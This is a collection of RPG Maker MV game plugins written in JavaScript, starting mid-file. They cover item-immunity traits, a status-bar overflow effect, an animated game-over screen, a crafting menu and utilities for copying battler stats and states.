		const y=this.getTextCenterY(ty);
		const pos=posAll[0];
		const xs=pos&&pos[1]===y?pos[0]:x;
		this._drawLine(ctx,xs,y,xe,y);
		posAll[0]=[xe,y];
	}else posAll[0]=undefined;
	if(this[tbl0[1]]){
		// _underLine
		const y=ty;
		const pos=posAll[1];
		const xs=pos&&pos[1]===y?pos[0]:x;
		this._drawLine(ctx,xs,y,xe,y);
		posAll[1]=[xe,y];
	}else posAll[1]=undefined;
	ctx.restore();
},t).add('getTextStartX',function f(x,w){
	const func=f.tbl[2][this._context.textAlign];
	return func?func(x,w):x;
},t).add('getTextCenterY',function f(y){
	return y-((this.fontSize-(this.fontSize>>2))>>1);
},t).add('_drawLine',(ctx,x0,y0,x1,y1)=>{
	ctx.beginPath();
	ctx.moveTo(x0,y0);
	ctx.lineTo(x1,y1);
	ctx.stroke();
}).add('_drawLineWidth',function f(){
	return (this.fontSize+((1<<f.tbl[5])-1))>>f.tbl[5]; // leave fontSize=0 to be 0
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 無視道具效果(可被用於該btlr但無效)
 * @author agold404
 * @help <無視道具效果:[id,id, ... ]>
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t; const gbb=Game_BattlerBase;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;

const kw='無視道具效果';
const kwt='TRAIT_'+kw;
const kwget='get_'+kw;
const kwis='is_'+kw;
gbb.addEnum(kwt);

t=[kwis,gbb[kwt],kw,kwt,];

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	let ts=dataobj.traits,c,t; if(!ts) ts=dataobj.traits=[];
	
	if(meta[kw]){
		const arr=JSON.parse(meta[kw]);
		for(let x=0,xs=arr.length;x!==xs;++x) ts.push({code:gbb[kwt],dataId:arr[x],value:1,});
	}
},
]);

new cfc(Game_Battler.prototype).add(kwget,function f(){
	return this.traitsSet(f.tbl[1]);
},t).add(kwis,function f(item){
	return DataManager.isItem(item) && this.traitsSet(f.tbl[1]).uniqueHas(item.id);
},t);

new cfc(Game_Action.prototype).add('applyItemEffect',function f(trgt, effect){
	return trgt[f.tbl[0]](this.item()) || f.ori.apply(this,arguments);
},t).add('makeDamageValue',function f(trgt, cri){
	return trgt[f.tbl[0]](this.item()) ? 0 : f.ori.apply(this,arguments);
},t);

})();


﻿"use strict";
/*:
 * @plugindesc MOG_Status 能力值出界特效
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

if(typeof MetersStatusM!=='undefined')(()=>{ let k,r,t;

new cfc(MetersStatusM.prototype).add('updateFlow',function f(sp,pCur,pMax,paramId){
	if(this._shadowBar) this._shadowBar.alpha=0;
	if(pMax>0 && pCur>pMax){
		arguments[1]=arguments[2];
		let sb=sp._shadowBar;
		if(!sb){
			sp.parent.addChild(sb=sp._shadowBar=new Sprite(sp.bitmap));
		}
		sb._anchor=sp._anchor;
		{ const frm=sp._frame; sb.setFrame(frm.x,frm.y,frm.width,frm.height); }
		sb.x=sp.x;
		sb.y=sp.y;
		sb.alpha=0;
		sb._shadowCtr|=0;
		++sb._shadowCtr;
		sb._shadowCtr%=f.tbl[0];
		const r=f.tbl[0]-sb._shadowCtr;
		if(r<f.tbl[1]){
			const alphaRate=r/f.tbl[1];
			const aniRate=Math.sin((1-alphaRate)*f.tbl[2])*(pCur/pMax-1)+1;
			sb.alpha=alphaRate*f.tbl[3];
			sb.scale.x=sp.scale.x*aniRate;
		}
	}
	return f.ori.apply(this,arguments);
},[
128, // total frame
64, // biggering and fading frame
Math.PI/2, // pre-cal.
0.5,
]);

})();


﻿"use strict";
/*:
 * @plugindesc 動態gameover
 * @author agold404
 * @help BLR_custom/GAMEOVER/GAMEOVER.txt
 * 
 * # 標題或說明。無視註解(包含井字號)後若為空列(只剩下tab或空白)，則無視此組。
 * # 每圖幾幀。用井字號使該列成為空列則使用預設值，預設值=1。
 * # 會變成候選者的條件。使用 javascript 的 eval ，故可直接輸入 js ，另可參考 title 。用井字號使該列成為空列則使用預設值，預設值=true。
 * # 隨機出現時的權重，負不計且不會被選到。用井字號使該列成為空列則使用預設值，預設值=1。
 * # 幀額外設定這圖幾幀，預設用上面的每圖幾幀 |圖1路徑
 * # 幀額外設定這圖幾幀，預設用上面的每圖幾幀|圖2路徑
 * # 圖3路徑
 * # ...
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const imgsStartIdx=4;

const parsing=t=function f(lines){
	const rtv=lines.split('\n').map(f.tbl[0]);
	if(rtv.length<=f.tbl[2]) return rtv;
	const errPre="Error: In '"+rtv[0]+"':\n got '";
	const errSuf="' parsing as Number. The result should not be an NaN.";
	const rtv1=(!rtv[1]||rtv[1].match(f.tbl[1]))?1:rtv[1]-0;
	if(isNaN(rtv1)){
		throw new Error(errPre+rtv[1]+errSuf);
	}
	rtv[1]=rtv1;
	const rtv3=(!rtv[3]||rtv[3].match(f.tbl[1]))?1:rtv[3]-0;
	if(isNaN(rtv3)){
		throw new Error(errPre+rtv[3]+errSuf);
	}
	rtv[3]=rtv3;
	for(let x=f.tbl[2],xs=rtv.length;x!==xs;++x){
		if(rtv[x].indexOf("|")>=0){
			rtv[x]=rtv[x].split("|");
			const rtvX0=rtv[x][0]; rtv[x][0]-=0;
			if(isNaN(rtv[x][0])){
				throw new Error(errPre+rtvX0+errSuf);
			}
		}else rtv[x]=[rtv1,rtv[x]];
	}
	return rtv;
};
t.ori=undefined;
t.tbl=[
line=>line.replace(/#.*$/,''),
/^[ \t]+$/,
imgsStartIdx,
];

t=[
"BLR_custom/GAMEOVER/GAMEOVER.txt", // 0: txt path
[/\r/g,'',/\n\n+/g], // 1: replace,split
parsing, // 2: map
lines=>lines&&lines[0]&&lines.length>imgsStartIdx, // 3: filter
group=>Scene_Title.prototype.create_customTitle.tbl[3](group), // 4: condition fitler
function(bm){
	const scale=this.scale;
	scale.y=scale.x=Math.min(Graphics.boxWidth/bm.width,Graphics.boxHeight/bm.height);;
}, // 5: load listener
];

new cfc(Scene_Boot.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.addLoadGameoverImgsInfos();
	return rtv;
}).add('addLoadGameoverImgsInfos',function f(){
	ImageManager.otherFiles_addLoad(f.tbl[0]);
},t);

new cfc(Scene_Gameover.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.parseData();
	this._currIdx=-1;
	return rtv;
}).add('parseData',function f(){
	const raw=ImageManager.otherFiles_getData(f.tbl[0]); if(!raw) return this._groups=[];
	const groups=this._groups=raw.replace(f.tbl[1][0],f.tbl[1][1]).split(f.tbl[1][2]).map(f.tbl[2]).filter(f.tbl[3]);
	const candis=groups.filter(f.tbl[4]);
	let s=0; for(let x=0,xs=candis.length;x!==xs;++x) s+=candis[x][3];
	let r=Math.random()*s,group;
	for(let x=0,xs=candis.length;x!==xs;++x) if((r-=candis[x][3])<0){ group=candis[x]; break; }
	this._group=group;
	this.parseData_preloadBitmap();
},t).add('parseData_preloadBitmap',function f(){
	if(!this._group) return;
	const sps=this._spritePools=[];
	for(let x=0,arr=this._group.slice(f.tbl[2].tbl[2]),xs=arr.length;x!==xs;++x){
		const bmp=ImageManager.loadNormalBitmap(arr[x][1]); // arr[x] = [duration,path]
		const sp=new Sprite(bmp);
		sp.x=Graphics.boxWidth>>1;
		sp.y=Graphics.boxHeight>>1;
		const anchor=sp.anchor; anchor.y=anchor.x=0.5;
		sp._info=arr[x];
		bmp.addLoadListener(f.tbl[5].bind(sp));
		sps.push(sp);
	}
},t).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	//this.create_customGameover();
	return rtv;
}).add('create_customGameover',function f(){
	if(!this._group) return;
	this.update_currSp(this._currIdx);
},t).add('update_currSp',function f(toIdx){
	const newSp=this._spritePools[toIdx];
	if(this._currIdx===toIdx||!newSp) return;
	this._currIdx=toIdx;
	if(this._currSp){
		if(this._currSp!==this.children[this._currSp._idx]) this.removeChild(this._currSp);
		else this.removeChildAt(this._currSp._idx);
	}
	newSp._idx=this.children.length;
	this.addChild(this._currSp=newSp);
	newSp._dur=newSp._info[0];
}).add('update_nextSp',function f(){
	if(!this._group||this._currSp&&(--this._currSp._dur>0)) return;
	const newIdx=this._spritePools?(this._currIdx+1)%this._spritePools.length:0;
	this.update_currSp(newIdx);
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.update_nextSp();
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 恢復道具套用藥劑精通
 * @author agold404
 * @help 所以為什麼內建不這麼做？
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Action.prototype).add('evalDamageFormula',function f(){
	let rtv=f.ori.apply(this,arguments);
	if(this.isItem()&&this.isRecover()) rtv*=this.subject().pha;
	return rtv;
});

})();


﻿"use strict";
/*:
 * @plugindesc 合成UI
 * @author agold404
 * @help data/合成.json
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const dataPath="data/合成.json";
const properties={
key:"名稱",
cost:"材料",
gain:"獲得",
display:"製作名稱",
description:"說明",
hideNameInRequirement:"hideNameInRequirement",
hideGain:"hideGain",
head:"head",
tail:"tail",
};
const itemListWidth=256;
const descriptionsHeight=96;
const descriptionsLineNum=3;
const putDataArrByType=tbl=>{
	if(!tbl.dataArrByType) tbl.dataArrByType={
		i:$dataItems,
		w:$dataWeapons,
		a:$dataArmors,
	};
};

const evaljs=(s,self)=>eval(s);

{
new cfc(Game_System.prototype).add('synthesis_getCont',function f(){
	let rtv=this._synthesis_cont; if(!rtv) rtv=this._synthesis_cont=[];
	if(!rtv._inlineMap) rtv._inlineMap=new Map();
	return rtv;
}).add('synthesis_setEnabled',function f(key){
	const s=this._synthesis_disabledSet;
	if(s) s.delete(key);
}).add('synthesis_setDisabled',function f(key){
	let s=this._synthesis_disabledSet; if(!(s instanceof Set)) s=this._synthesis_disabledSet=new Set();
	s.add(key);
	return s;
}).add('synthesis_clearAll',function f(){
	const cont=this.synthesis_getCont();
	cont.length=0;
	cont._cache=undefined;
	cont._inlineMap.clear();
	this._synthesis_selAll=false;
	this.synthesis_setDisabled().clear();
}).add('synthesis_selectAll',function f(key){
	const cont=this.synthesis_getCont();
	cont._cache=undefined;
	this._synthesis_selAll=true;
}).add('synthesis_addItem',function f(key){
	const cont=this.synthesis_getCont();
	cont._cache=undefined;
	cont.push(['a',key]);
}).add('synthesis_rmItem',function f(key){
	const cont=this.synthesis_getCont();
	cont._cache=undefined;
	if(cont._inlineMap.has(key)) cont._inlineMap.delete(key);
	else cont.push(['r',key]);
}).add('synthesis_addItemInline',function f(key,cost,gain,display){
	const info={key:key,cost:cost,gain:gain}; if(3<arguments.length) info.display=display;
	const cont=this.synthesis_getCont();
	cont._cache=undefined;
	cont.push(['i',key]);
	cont._inlineMap.set(key,info);
}).add('synthesis_getList',function f(){
	const arr=this.synthesis_getCont(),tmp=[],s=new Set();
	if(arr._cache) return arr._cache;
	for(let x=arr.length;x--;){ const key=arr[x][1];
		if(s.has(key)) continue; else s.add(key);
		switch(arr[x][0]){
		case 'a':{
			if(arr._inlineMap.has(key)){ tmp.push(['i',key]); continue; }
			if(this._synthesis_selAll) contiune;
		}break;
		case 'r':{
			if(!this._synthesis_selAll) contiune;
		}break;
		case 'i':{
			if(!arr._inlineMap.has(key)) continue;
		}break;
		}
		tmp.push(arr[x]);
	}
	arr.length=0;
	const rtv=[];
	for(let x=tmp.length;x--;){
		rtv.push(tmp[x]);
		arr.push(tmp[x]);
	}
	rtv._inlineMap=new Map(arr._inlineMap);
	rtv._selAll=this._synthesis_selAll;
	rtv._disabledSet=this._synthesis_disabledSet;
	return arr._cache=rtv;
});
}


{
const a=function Window_合成_list(){
	this.initialize.apply(this, arguments);
};
a.ori=Window_Command;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
const tbl=[
a.ori.prototype,
64, // wait start
64, // stop
8, // pad scroll
];
new cfc(p).add('initialize',function f(x,y,allList,selInfo){
	const rtv=f.tbl[0].initialize.apply(this,arguments);
	this.initSel(allList,selInfo);
	this._drawTextExStartOffsetXTimer=0;
	this.refresh();
	return rtv;
},tbl).add('initSel',function f(allList,selInfo){
	// (allList=[{},...])._key2info; // from Scene_合成.createAll_parseData
	// selInfo=$gameSystem.synthesis_getList();
	this._data=[];
	if(!selInfo) return;
	const selKey2type=new Map(); selInfo.forEach(f.tbl[1],selKey2type);
	if(selInfo._selAll){
		for(let x=0,arr=allList,xs=arr.length;x!==xs;++x){
			const key=arr[x][f.tbl[0].key];
			if(selKey2type.has(key)) continue; // 'r' , 'i'
			this._data.push(arr[x]);
		}
		for(let x=0,arr=selInfo,xs=arr.length;x!==xs;++x){
			if(arr[x][0]!=='i') continue;
			this._data.push(selInfo._inlineMap.get(arr[x][1]));
		}
	}else{
		for(let x=0,arr=selInfo,xs=arr.length;x!==xs;++x){
			if(arr[x][0]==='a') this._data.push(allList._key2info.get(arr[x][1]));
			else this._data.push(selInfo._inlineMap.get(arr[x][1]));
		}
	}
	this._disabledSet=selInfo._disabledSet;
	return this._data;
},[
properties,
function(x){ this.set(x[1],x[0]); },
]).add('makeCommandList',function f(){
	if(!this._data) return;
	this._data.forEach(f.tbl[0],this);
},t=[
function f(info){
	const enabled=this._disabledSet&&!this._disabledSet.has(info[f.tbl.key]);
	this.addCommand(info[f.tbl.display],info[f.tbl.key],enabled);
}, // forEach
],true,true).add('checkCostsEnough',function f(info){
	f.tbl[1](f.tbl); if(!info) return false;
	const costs=info[f.tbl[0].cost];
	for(let x=0,arr=costs,xs=arr.length;x!==xs;++x){
		const info=arr[x];
		if('g'===info[0]){ if(!($gameParty.gold()>=info[1])) return false; }
		else if('j'===info[0]){ if(!f.tbl[2](info[1],this)) return false; }
		else{ if(!($gameParty.numItems(f.tbl.dataArrByType[info[0]][info[1]])>=info[2])) return false; }
	}
	return true;
},[properties,putDataArrByType,evaljs]).add('getCurrentInfo',function(index){
	const idx=index===undefined?this._index:index;
	return this._data[idx];
}).add('isCommandEnabled',function f(index){
	const rtv=this._data[index] && f.tbl[0].isCommandEnabled.apply(this,arguments);
	return rtv && this.checkCostsEnough(this._data[index]);
},tbl,false,true).add('isCurrentItemEnabled',function(index){
	return this.isCommandEnabled(this.index());
},undefined,false,true).add('drawItem',function(index){
	if(!(index>=0 && index<this.maxItems())) return;
	const rect=this.itemRectForText(index);
	const align=this.itemTextAlign();
	this.resetTextColor();
	this.changePaintOpacity(this.isCommandEnabled(index));
	const offsetX=this.drawItem_getOffsetX();
	const res=this.drawTextEx(this.commandName(index), rect.x-offsetX, rect.y, rect.width, align);
	this._drawTextExCurrentTextWidth=res+(this.textPadding()<<1);
	this._drawTextExCurrentTextWidthMax=this._drawTextExCurrentTextWidth-this.contentsWidth();
	this._drawTextExLastOffsetX=offsetX;
},undefined,false,true).add('drawItem_getOffsetX',function f(){
	return Math.max(Math.min(this._drawTextExCurrentTextWidthMax,this._drawTextExStartOffsetXTimer-f.tbl[1]),0)||0;
},tbl,false,true).add('select',function f(idx){
	const idx0=this._index;
	const rtv=f.tbl[0].select.apply(this,arguments);
	this._drawTextEx_clearCache();
	const mit=this.maxItems();
	if(idx0>=0) this.redrawItem(idx0); // clear last (disappeared?)
	if(this._index>=0&&this._index<mit){
		this.redrawItem(this._index);
		const info=this._data[this._index]; if(info){
			const rw=this._requirementsWindow;
			if(rw) rw.refreshHelp(info);
			const aw=this._descriptionsWindow;
			if(aw) aw.refreshHelp(info);
		}
	}
	return rtv;
},tbl).add('_drawTextEx_clearCache',function f(){
	this._drawTextExStartOffsetXTimer=0;
	this._drawTextExCurrentTextWidth=undefined;
	this._drawTextExCurrentTextWidthMax=undefined;
	this._drawTextExLastOffsetX=undefined;
	this._drawTextExStartOffsetXLastFc=undefined;
},tbl).add('update',function f(){
	const rtv=f.tbl[0].update.apply(this,arguments);
	if(this._drawTextExStartOffsetXLastFc!==Graphics.frameCount){
		this._drawTextExStartOffsetXTimer+=Graphics.frameCount-this._drawTextExStartOffsetXLastFc||0;
		this._drawTextExStartOffsetXLastFc=Graphics.frameCount;
	}
	if(!(this._drawTextExStartOffsetXTimer-f.tbl[1]-f.tbl[2]<this._drawTextExCurrentTextWidthMax)) this._drawTextExStartOffsetXTimer=0;
	if(this.drawItem_getOffsetX()!==this._drawTextExLastOffsetX) this.redrawItem(this._index);
	return rtv;
},tbl,false,true).add('refresh',function f(){
	this._drawTextEx_clearCache();
	const rtv=f.tbl[0].refresh.apply(this,arguments);
	this._drawTextEx_clearCache();
	return rtv;
},tbl,false,true);
t[0].ori=undefined; t[0].tbl=properties;
}


{
const a=function Scene_合成(){
	this.initialize.apply(this, arguments);
};
a.ori=Scene_MenuBase;
window[a.name]=a;
const p=a.prototype=Object.create(a.ori.prototype);
p.constructor=a;
t=[
a.ori.prototype,
a.ori,
['itemList','amounts',], // 2
{
itemList:{x:0,y:0,w:itemListWidth,h:undefined,align:""},
requirements:{x:itemListWidth,y:0,w:undefined,h:undefined,align:"afterX",},
descriptions:{x:itemListWidth,y:undefined,w:undefined,h:descriptionsHeight,align:"afterY",lineNum:descriptionsLineNum,},
}, // 3
[
dataPath, // 4-0
info=>info&&(properties.key in info), // 4-1
" repeated: ", // 4-2
new Set([
	'cancel',
]), // 4-3
"持有數量/獲得數量", // 4-4
"製作成功：", // 4-5
"\\TXTCENTER:\"未知\"", // 4-6
], // 4
properties, // 5
['cost','gain',], // 6
[2,], // 7: iconPadding,
[
function f(){
	const ori=Window_Base.prototype.standardFontSize.apply(this,arguments);
	return (ori>>1)+(ori>>2);
}, // 8-0
jsInfo=>jsInfo[2], // 8-1
evaljs, // 8-2
], // 8: funcs
[putDataArrByType,], // 9: make tbl
{loc:"DR",}, // 10: opt of popupMsg
{name:"Item3",volume:75,pitch:100}, // 11: success sound effect
[ "#FFFFFF" , "#FF0000" ], // 12: // \TXTCOLOR // [ init req text color , insufficient text color ]
];

new cfc(p).add('initialize',function f(){
	const rtv=f.tbl[0].initialize.apply(this,arguments);
	this.init();
	return rtv;
},t).add('init',function f(){
	this._state=f.tbl[2][0];
	ImageManager.otherFiles_addLoad(f.tbl[4][0]);
},t).add('create',function f(){
	const rtv=f.tbl[0].create.apply(this,arguments);
	this.createAll();
	return rtv;
},t).add('getRoot',function f(){
	return this._root;
}).add('createAll',function f(){
	f.tbl[9][0](f.tbl);
	this.createAll_parseData();
	this.createAll_root();
	this.createWindow_itemListWindow();
	this.createWindow_requirementsWindow();
	this.createWindow_descriptionsWindow();
	this.createAll_finalTune();
},t).add('createAll_parseData',function f(){
	const raw=ImageManager.otherFiles_getData(f.tbl[4][0]);
	if(!raw) return;
	const arr=this._data=JSON.parse(raw).filter(f.tbl[4][1]);
	const m=this._data._key2info=new Map();
	for(let x=0,xs=arr.length;x!==xs;++x){
		if(!(f.tbl[5].description in arr[x])) arr[x][f.tbl[5].description]="";
		if(!(f.tbl[5].display in arr[x])) arr[x][f.tbl[5].display]=arr[x][f.tbl[5].key];
		const key=arr[x][f.tbl[5].key];
		if(f.tbl[4][3].has(key)){
			throw new Error("you cannot use "+key+" as internal name.");
		}
		if(m.has(key)){
			throw new Error(f.tbl[5].key+f.tbl[4][2]+key);
		}
		m.set(key,arr[x]);
	}
},t).add('createAll_root',function f(){
	this.addChild(this._root=new Sprite());
},t).add('createWindow_itemListWindow',function f(){
	const sp=this._itemListWindow=new Window_合成_list(0,0,this._data,$gameSystem.synthesis_getList());
	const conf=f.tbl[3].itemList; conf.h=Graphics.boxHeight;
	sp.positioning(conf);
	this.getRoot().addChild(sp);
},t).add('createWindow_itemListWindow_okHandler',function f(){
	// bind `this` to scene
	const self=this._itemListWindow; if(!self.isCurrentItemEnabled()){ SoundManager.playBuzzer(); return self.activate(); }
	const info=self.getCurrentInfo(); if(!info) return;
	//const costs=info[f.tbl[5].cost];
	//const gains=info[f.tbl[5].gain];
	for(let keys=f.tbl[6],z=keys.length,cw2=self.contentsWidth()>>1;z--;){
		const coef=1-(z<<1);
		for(let i=0,arr=info[f.tbl[5][keys[z]]],xs=arr.length;i!==xs;++i){
			const info=arr[i];
			if('g'===info[0]) $gameParty.gainGold(coef*info[1]);
			else if('j'===info[0]) f.tbl[8][2](info[1],this);
			else{
				const item=f.tbl.dataArrByType[info[0]][info[1]];
				$gameParty.gainItem(item,coef*info[2]);
				self.refreshItemsEnabled&&self.refreshItemsEnabled();
			}
		}
	}
	if($gameTemp.popupMsg){
		$gameTemp.popupMsg(f.tbl[4][5]+info[f.tbl[5].display],f.tbl[10]);
		AudioManager.playSe(f.tbl[11]);
	}
	self.activate();
},t).add('createWindow_requirementsWindow',function f(){
	const sp=this._requirementsWindow=new Window_Base();
	sp.processNormalCharacter=Window_Message.prototype.processNormalCharacter;
	sp.standardFontSize=f.tbl[8][0];
	const conf=f.tbl[3].requirements; conf.w=Graphics.width-f.tbl[3].itemList.w; conf.h=Graphics.boxHeight-f.tbl[3].descriptions.h;
	sp.positioning(conf);
	this.getRoot().addChild(sp);
	if($gameTemp.popupMsg) $gameTemp.popupMsg(f.tbl[4][4],f.tbl[10]);
},t).add('createWindow_requirementsWindow_refreshHelp',function f(info){
	f.tbl[9][0](f.tbl);
	// this._requirementsWindow.refreshHelp=this.createWindow_requirementsWindow_refreshHelp;
	this.createContents();
	const lh=this.lineHeight(),x0=this.textPadding();
	let x=x0,y=0,res={};
	if(info[f.tbl[5].head]){ this.drawTextEx(info[f.tbl[5].head],x,y,undefined,undefined,res); y=res.y+lh; }
	if(!info[f.tbl[5].hideNameInRequirement]){
		this.drawTextEx("\\TXTCENTER:\""+f.tbl[5].display+"\"",x,y,undefined,undefined,res); y=res.y+lh;
		this.drawTextEx(info[f.tbl[5].display],x,y,undefined,undefined,res); y=res.y+lh;
	}
	for(let z=0,keys=f.tbl[6],cw2=this.contentsWidth()>>1;z<keys.length;++z){
		x=x0;
		y+=lh;
		this.drawTextEx("\\TXTCENTER:\""+f.tbl[5][keys[z]]+"\"",x,y,undefined,undefined,res); y=res.y+lh;
		if(info[f.tbl[5].hideGain]&&'gain'===keys[z]){
			this.drawTextEx(f.tbl[4][6],x,y,undefined,undefined,res); y=res.y+lh;
			continue;
		}
		for(let i=0,arr=info[f.tbl[5][keys[z]]],xs=arr.length;i!==xs;++i){
			const info=arr[i];
			if('g'===info[0]){
				const usingGoldIcon=this.usingGoldIcon&&this.usingGoldIcon(TextManager.currencyUnit);
				const beRed=!($gameParty.gold()>=info[1]-0);
				const signedNumInfo1='gain'===keys[z]?(info[2]<0?info[2]:"+"+info[2]):(info[1]<0?"+"+info[1]:'-'+info[1]); // cost
				const s=('\\TXTCOLOR"'+f.tbl[12][beRed|0]+'"')+$gameParty.gold()+' \\G'+' / '+signedNumInfo1+' \\G'+('\\TXTCOLOR"'+f.tbl[12][0]+'"');
				if(x>=cw2){
					// detect auto newLine
					if(usingGoldIcon) x+=Window_Base._iconWidth+f.tbl[7][0];
					const mockRes=Object.assign({},res);
					this._is_戰鬥介面選單文字消失=true;
					this.drawTextEx(' ',x,y,undefined,undefined,mockRes);
					const standardY=mockRes.y;
					Object.assign(mockRes,res);
					this.drawTextEx(s,x,y,undefined,undefined,mockRes);
					const resY=mockRes.y;
					this._is_戰鬥介面選單文字消失=false;
					if(standardY!==resY){
						x=x0;
						y=res.y+lh;
					}else if(usingGoldIcon) x-=Window_Base._iconWidth+f.tbl[7][0];
				}
				if(usingGoldIcon){
					this.drawIcon(Yanfly.Icon.Gold, x, y);
					x+=Window_Base._iconWidth+f.tbl[7][0];
				}
				this.drawTextEx(s,x,y,undefined,undefined,res);
				if(usingGoldIcon){
					x-=Window_Base._iconWidth+f.tbl[7][0];
				}
			}else if('j'===info[0]){
				if(info[2]){
					const beRed='cost'===keys[z]&&!f.tbl[8][2](info[1],this);
					this.drawTextEx(('\\TXTCOLOR"'+f.tbl[12][beRed|0]+'"')+info[2],x,y,undefined,undefined,res);
				}
			}else{
				const item=f.tbl.dataArrByType[info[0]][info[1]];
				const beRed=!('gain'===keys[z]||$gameParty.numItems(item)>=info[2]-0);
				const signedNumInfo2='gain'===keys[z]?(info[2]<0?info[2]:"+"+info[2]):(info[2]<0?"+"+(-info[2]):'-'+info[2]); // cost
				const s=('\\TXTCOLOR"'+f.tbl[12][0]+'"')+item.name+' '+('\\TXTCOLOR"'+f.tbl[12][beRed|0]+'"')+$gameParty.numItems(item)+'/'+signedNumInfo2+('\\TXTCOLOR"'+f.tbl[12][0]+'"');
				if(x>=cw2){
					// detect auto newLine
					if(item.iconIndex) x+=Window_Base._iconWidth+f.tbl[7][0];
					const mockRes=Object.assign({},res);
					this._is_戰鬥介面選單文字消失=true;
					this.drawTextEx(' ',x,y,undefined,undefined,mockRes);
					const standardY=mockRes.y;
					Object.assign(mockRes,res);
					this.drawTextEx(s,x,y,undefined,undefined,mockRes);
					const resY=mockRes.y;
					this._is_戰鬥介面選單文字消失=false;
					if(standardY!==resY){
						x=x0;
						y=res.y+lh;
					}else if(item.iconIndex) x-=Window_Base._iconWidth+f.tbl[7][0];
				}
				if(item.iconIndex){
					this.drawIcon(item.iconIndex,x,y);
					x+=Window_Base._iconWidth+f.tbl[7][0];
				}
				this.drawTextEx(s,x,y,undefined,undefined,res);
				if(item.iconIndex){
					x-=Window_Base._iconWidth+f.tbl[7][0];
				}
			}
			if(res.x<cw2){
				x=cw2;
				y=res.y;
			}else{
				x=x0;
				y=res.y+lh;
			}
		}
	}
	if(info[f.tbl[5].tail]){ this.drawTextEx(info[f.tbl[5].tail],x,y,undefined,undefined,res); y=res.y+lh; }
},t).add('createWindow_descriptionsWindow',function f(){
	const sp=this._descriptionsWindow=new Window_Help();
	const fsz0=sp.standardFontSize(),fsz=(fsz0>>1)+(fsz0>>3),LH0=(fsz*3),LH125=LH0>>1; sp.changeFontSize(fsz); sp.standardFontSize=()=>fsz; sp.lineHeight=()=>LH125;
	sp.height=sp.fittingHeight(f.tbl[3].descriptions.lineNum);
	const conf=f.tbl[3].descriptions; conf.y=f.tbl[3].requirements.h; conf.w=f.tbl[3].requirements.w;
	sp.positioning(conf,this._requirementsWindow);
	this.getRoot().addChild(sp);
},t).add('createWindow_descriptionsWindow_refreshHelp',function f(info){
	this.setText(info[f.tbl[5].description]);
},t).add('createAll_finalTune',function f(){
	// rwd (to font size setting) size
	{
		const h=Math.max(this._descriptionsWindow.fittingHeight(f.tbl[3].descriptions.lineNum),this._descriptionsWindow.height);
		if(h!==this._descriptionsWindow.height){
			this._requirementsWindow.height-=h-this._descriptionsWindow.height;
			this._descriptionsWindow.height=h;
			this._descriptionsWindow.createContents();
		}
	}
	// link
	this._itemListWindow._requirementsWindow=this._requirementsWindow;
	this._itemListWindow._descriptionsWindow=this._descriptionsWindow; // as help window
	this._requirementsWindow.refreshHelp=this.createWindow_requirementsWindow_refreshHelp;
	this._descriptionsWindow.refreshHelp=this.createWindow_descriptionsWindow_refreshHelp;
	// display
	this._itemListWindow.refresh();
	this._itemListWindow.reselect();
	this._descriptionsWindow.deactivate();
	// input
	this._itemListWindow.setHandler('cancel',this.popScene.bind(this));
	this._itemListWindow.setHandler('ok',this.createWindow_itemListWindow_okHandler.bind(this));
	// re-adjust loc
	this._requirementsWindow.y+=this._descriptionsWindow.height;
	this._descriptionsWindow.y=0;
},t).add('getInfo',function f(key){
	return this._data._key2info.get(key);
},t);
}

})();


﻿"use strict";
/*:
 * @plugindesc battler複製能力API
 * @author agold404
 * @help battler.setSame_東西(另一個btlr)
 * 東西: 能力值/狀態
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Battler.prototype).add('setSame_能力值',function f(btlr){
	if(this===btlr) return;
	for(let x=0,_=btlr._paramPlus,xs=_.length;x!==xs;++x) this._paramPlus[x]=(btlr.paramBase(x)+btlr.paramPlus(x)-0||0)-(this.paramBase(x)-0||0);
},undefined,true,true).add('setSame_狀態',function f(btlr){
	if(this===btlr) return;
	this.clearStates();
	if(btlr._states){ for(let x=0,arr=btlr._states.slice(),xs=arr.length,id;x!==xs;++x){
		id=arr[x];
		this.addState(id);
		if(this._stateTurns && btlr._stateTurns && !isNaN(btlr._stateTurns[id])) this._stateTurns[id]=btlr._stateTurns[id];
		if(this._stateSteps && btlr._stateSteps && !isNaN(btlr._stateSteps[id])) this._stateSteps[id]=btlr._stateSteps[id];
	} }
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 指定特定道具會在戰鬥中的道具類別中顯示
 * @author agold404
 * @help <shownInBattle>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw='shownInBattle';

t=[
kw,
function(dataobj){ const meta=dataobj&&dataobj.meta; if(!meta) return;
	dataobj[this[0]]=!!meta[this[0]];
},
];

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataItems   .forEach(f.tbl[1],f.tbl);
	$dataWeapons .forEach(f.tbl[1],f.tbl);
	$dataArmors  .forEach(f.tbl[1],f.tbl);
	return f.ori.apply(this,arguments);
},t);

